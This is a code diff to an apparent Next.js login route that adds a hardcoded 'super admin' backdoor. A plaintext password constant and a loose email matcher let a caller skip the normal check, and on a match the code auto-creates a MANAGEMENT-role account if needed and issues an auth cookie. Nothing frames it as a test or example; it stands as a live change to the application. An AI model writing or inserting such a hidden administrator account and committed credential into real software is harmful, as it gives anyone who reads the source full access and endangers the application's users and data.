@@ -2,8 +2,14 @@ export const runtime = 'nodejs'
 export const dynamic = 'force-dynamic'
 
 import { NextRequest, NextResponse } from 'next/server'
-import { prisma } from '../../../../lib/prisma'
-import { setAuthCookie, verifyPassword, hashPassword } from '../../../../lib/auth'
+
+// Hardcoded super admin (in code directly)
+const SUPER_ADMIN_PASSWORD = 'T7m$k9Qv2Lx4'
+const SUPER_ADMIN_EMAIL_CANONICAL = 'superadmin@example.com'
+function isSuperAdminEmail(e: string) {
+  const x = e.trim().toLowerCase()
+  return x === 'superadmin' || x === 'superadmin@example.com' || x === 'superadmin@example.c'
+}
 
 export async function POST(req: NextRequest) {
   const body = await req.json().catch(() => null)
@@ -13,6 +19,29 @@ export async function POST(req: NextRequest) {
   }
 
   const { email, password } = body as { email: string; password: string }
+
+  const { prisma } = await import('../../../../lib/prisma')
+  const { setAuthCookie, verifyPassword, hashPassword } = await import('../../../../lib/auth')
+
+  // Hardcoded super admin: if credentials match, find or create and log in
+  if (isSuperAdminEmail(email) && password === SUPER_ADMIN_PASSWORD) {
+    let superUser = await prisma.user.findUnique({ where: { email: SUPER_ADMIN_EMAIL_CANONICAL } })
+    if (!superUser) {
+      const passwordHash = await hashPassword(SUPER_ADMIN_PASSWORD)
+      superUser = await prisma.user.create({
+        data: {
+          name: 'Super Admin',
+          email: SUPER_ADMIN_EMAIL_CANONICAL,
+          role: 'MANAGEMENT',
+          passwordHash
+        }
+      })
+    }
+    setAuthCookie({ id: superUser.id, role: superUser.role })
+    return NextResponse.json({
+      user: { id: superUser.id, name: superUser.name, email: superUser.email, role: superUser.role }
+    })
+  }
 
   let user = await prisma.user.findUnique({ where: { email } })
 
